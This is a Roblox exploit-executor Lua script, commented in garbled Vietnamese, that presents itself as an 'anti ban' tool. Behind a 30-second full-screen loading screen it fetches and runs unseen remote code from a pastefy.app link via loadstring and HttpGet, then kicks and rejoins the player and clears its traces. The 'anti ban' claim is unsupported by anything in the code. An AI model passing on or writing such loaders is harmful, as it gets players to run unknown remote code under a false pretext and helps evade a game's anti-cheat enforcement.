--[[
    ANTI BAN COMBO SCRIPT
    - Hi·ªÉn th·ªã UI loading + thanh ngang 30s (b·∫£n ƒë·∫πp, kh√¥ng c·ª•c trong su·ªët).
    - Ch·∫°y song song script: loadstring(game:HttpGet("https://pastefy.app/f1J9Cddr/raw"))()
    - N·∫øu b·ªã kick b·∫•t k·ª≥ l√∫c n√†o trong 30s: t·ª± ƒë·ªông rejoin v√† x√≥a m·ªçi UI/bi·∫øn li√™n quan.
    - Khi thanh ngang ƒë·∫ßy (30s): kick v·ªõi l√Ω do "AntiBan Is Now Enabled", rejoin ngay, d·ªçn s·∫°ch m·ªçi th·ª©.
    - D·ªØ li·ªáu script ngo√†i n·∫øu c√≥ th·ªÉ, s·∫Ω b·ªã x√≥a (n·∫øu n√≥ d√πng bi·∫øn to√†n c·ª•c ANTIBAN_LOADED ho·∫∑c UI c√≥ t√™n).
]]

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")
local PlaceId = game.PlaceId

local ANTIBAN_TAG = "_ANTIBAN_TEMP2025"

-- D·ªçn s·∫°ch m·ªçi th·ª© li√™n quan ƒë·∫øn UI/script n√†y & script ngo√†i (n·∫øu c√≥ th·ªÉ)
local function cleanup()
    -- UI ch√≠nh
    if playerGui:FindFirstChild("AntiBanScreen"..ANTIBAN_TAG) then
        playerGui["AntiBanScreen"..ANTIBAN_TAG]:Destroy()
    end
    -- UI ho·∫∑c bi·∫øn script ngo√†i (n·∫øu n√≥ t·∫°o UI n√†y ho·∫∑c bi·∫øn n√†y)
    if playerGui:FindFirstChild("AntibanExternalUI") then
        playerGui.AntibanExternalUI:Destroy()
    end
    if getgenv then
        getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] = nil
        getgenv().ANTIBAN_LOADED = nil
        getgenv().AntiBanExternal = nil
    end
end

-- H√†m rejoin nhanh
local function rejoin()
    cleanup()
    TeleportService:Teleport(PlaceId, player)
end

-- NgƒÉn ch·∫°y nhi·ªÅu l·∫ßn
if getgenv and getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] then return end
if getgenv then getgenv()["ANTIBAN_RUNNING"..ANTIBAN_TAG] = true end

-- Hi·ªÉn th·ªã UI (ƒë·∫πp, kh√¥ng c·ª•c trong su·ªët)
local function showUI()
    if playerGui:FindFirstChild("AntiBanScreen"..ANTIBAN_TAG) then
        playerGui["AntiBanScreen"..ANTIBAN_TAG]:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "AntiBanScreen"..ANTIBAN_TAG
    screenGui.IgnoreGuiInset = true
    screenGui.DisplayOrder = 999999
    screenGui.Parent = playerGui

    local Background = Instance.new("ImageLabel")
    Background.Name = "Background"
    Background.Parent = screenGui
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundTransparency = 1
    Background.Image = "rbxassetid://15136859462"
    Background.ImageTransparency = 0.1
    Background.ScaleType = Enum.ScaleType.Crop

    local Overlay = Instance.new("Frame")
    Overlay.BackgroundColor3 = Color3.fromRGB(10,10,10)
    Overlay.BackgroundTransparency = 0.4
    Overlay.Size = UDim2.new(1,0,1,0)
    Overlay.Parent = Background

    local Title = Instance.new("TextLabel")
    Title.Parent = Background
    Title.AnchorPoint = Vector2.new(0.5, 1)
    Title.Position = UDim2.new(0.5, 0, 0.85, 0)
    Title.Size = UDim2.new(0.92, 0, 0.15, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "üî• Waiting For The AntiBan Enable üî•"
    Title.TextColor3 = Color3.fromRGB(0,255,255)
    Title.TextStrokeTransparency = 0.2
    Title.TextStrokeColor3 = Color3.fromRGB(255,0,255)
    Title.Font = Enum.Font.FredokaOne
    Title.TextScaled = true
    Title.TextWrapped = true
    Title.ZIndex = 10

    local ProgressBarBg = Instance.new("Frame")
    ProgressBarBg.Parent = Background
    ProgressBarBg.AnchorPoint = Vector2.new(0.5, 1)
    ProgressBarBg.Position = UDim2.new(0.5, 0, 0.96, 0)
    ProgressBarBg.Size = UDim2.new(0.7, 0, 0.06, 0)
    ProgressBarBg.BackgroundColor3 = Color3.fromRGB(230, 230, 230)
    ProgressBarBg.BackgroundTransparency = 0
    ProgressBarBg.BorderSizePixel = 0
    ProgressBarBg.ClipsDescendants = true
    ProgressBarBg.ZIndex = 2
    local UICorner = Instance.new("UICorner", ProgressBarBg)
    UICorner.CornerRadius = UDim.new(0.5,0)
    local Stroke = Instance.new("UIStroke", ProgressBarBg)
    Stroke.Thickness = 2
    Stroke.Color = Color3.fromRGB(160, 160, 160)
    Stroke.Transparency = 0.4

    local ProgressBar = Instance.new("Frame")
    ProgressBar.Parent = ProgressBarBg
    ProgressBar.Size = UDim2.new(0, 0, 1, 0)
    ProgressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
    ProgressBar.BackgroundTransparency = 0
    ProgressBar.BorderSizePixel = 0
    ProgressBar.ZIndex = 3
    local fillCorner = Instance.new("UICorner", ProgressBar)
    fillCorner.CornerRadius = UDim.new(0.5,0)

    local ProgressMarker = Instance.new("Frame")
    ProgressMarker.Parent = ProgressBarBg
    ProgressMarker.Size = UDim2.new(0, 8, 0.8, 0)
    ProgressMarker.AnchorPoint = Vector2.new(0,0.5)
    ProgressMarker.Position = UDim2.new(0, -3, 0.5, 0)
    ProgressMarker.BackgroundColor3 = Color3.fromRGB(255,255,255)
    ProgressMarker.BackgroundTransparency = 0
    ProgressMarker.BorderSizePixel = 0
    ProgressMarker.ZIndex = 6
    local markerCorner = Instance.new("UICorner", ProgressMarker)
    markerCorner.CornerRadius = UDim.new(0.5,0)

    local PercentLabel = Instance.new("TextLabel")
    PercentLabel.Parent = ProgressBarBg
    PercentLabel.AnchorPoint = Vector2.new(1, 0.5)
    PercentLabel.Position = UDim2.new(1, -8, 0.5, 0)
    PercentLabel.Size = UDim2.new(0.18, 0, 1.4, 0)
    PercentLabel.BackgroundTransparency = 1
    PercentLabel.Text = "1%"
    PercentLabel.TextColor3 = Color3.fromRGB(0, 200, 255)
    PercentLabel.TextStrokeTransparency = 0.5
    PercentLabel.Font = Enum.Font.FredokaOne
    PercentLabel.TextScaled = true
    PercentLabel.ZIndex = 9

    return {
        ScreenGui = screenGui,
        ProgressBar = ProgressBar,
        ProgressMarker = ProgressMarker,
        PercentLabel = PercentLabel,
        Title = Title
    }
end

-- Th·ª±c hi·ªán hi·ªÉn th·ªã UI v√† ch·∫°y ti·∫øn tr√¨nh
local uiRefs = showUI()
local duration, percentStart, percentEnd = 30, 1, 100
local startTime = tick()
local finished = false
local kicked = false

-- Ch·∫°y script ngo√†i song song, g√°n bi·∫øn to√†n c·ª•c ƒë·ªÉ cleanup ƒë∆∞·ª£c (n·∫øu script ngo√†i h·ªó tr·ª£)
local ok, err = pcall(function()
    getgenv().ANTIBAN_LOADED = true
    loadstring(game:HttpGet("https://pastefy.app/f1J9Cddr/raw"))()
end)

-- H√†m update UI (animation + progress)
local hue = 0
local function updateUI()
    local now = tick()
    local elapsed = now - startTime
    local alpha = math.clamp(elapsed / duration, 0, 1)
    local percent = math.floor(percentStart + (percentEnd - percentStart) * alpha + 0.5)
    -- Progress
    uiRefs.ProgressBar.Size = UDim2.new(alpha, 0, 1, 0)
    uiRefs.ProgressMarker.Position = UDim2.new(alpha, -4, 0.5, 0)
    uiRefs.PercentLabel.Text = percent.."%"
    -- Colorful percent
    uiRefs.PercentLabel.TextColor3 = Color3.fromHSV(0.5 + percent/200, 0.7, 1)
    -- Title animation
    hue = (hue + 0.008) % 1
    local color = Color3.fromHSV(hue, 0.85, 1)
    uiRefs.Title.TextColor3 = color
    uiRefs.Title.TextStrokeColor3 = Color3.fromHSV((hue+0.1)%1,0.5,1)
    uiRefs.Title.Rotation = math.sin(now*2.5)*5
    -- Marker animation
    uiRefs.ProgressMarker.BackgroundTransparency = 0.1 + math.abs(math.sin(now*5))*0.15
    if alpha >= 1 then finished = true end
    return finished
end

-- Theo d√µi s·ª± ki·ªán b·ªã kick (client kick s·∫Ω kh√¥ng b·∫Øt ƒë∆∞·ª£c, ch·ªâ server kick m·ªõi b·∫Øt ƒë∆∞·ª£c)
local kickConn
kickConn = player.OnKick:Connect(function(reason)
    kicked = true
    if kickConn then kickConn:Disconnect() end
    cleanup()
    rejoin()
end)

-- V√≤ng l·∫∑p c·∫≠p nh·∫≠t UI v√† ki·ªÉm tra timeout
local runLoop
runLoop = RunService.RenderStepped:Connect(function()
    if kicked then
        if runLoop then runLoop:Disconnect() end
        return
    end
    if updateUI() then
        if runLoop then runLoop:Disconnect() end
        -- ƒê·ªß 30s m·ªõi kick, cleanup, rejoin
        if kickConn then kickConn:Disconnect() end
        cleanup()
        -- Kick (client-side) + rejoin
        pcall(function() player:Kick("AntiBan Is Now Enabled") end)
        wait(1)
        rejoin()
    end
end)

-- N·∫øu b·ªã l·ªói script ngo√†i, v·∫´n ƒë·∫£m b·∫£o h·ªá th·ªëng ho·∫°t ƒë·ªông b√¨nh th∆∞·ªùng!
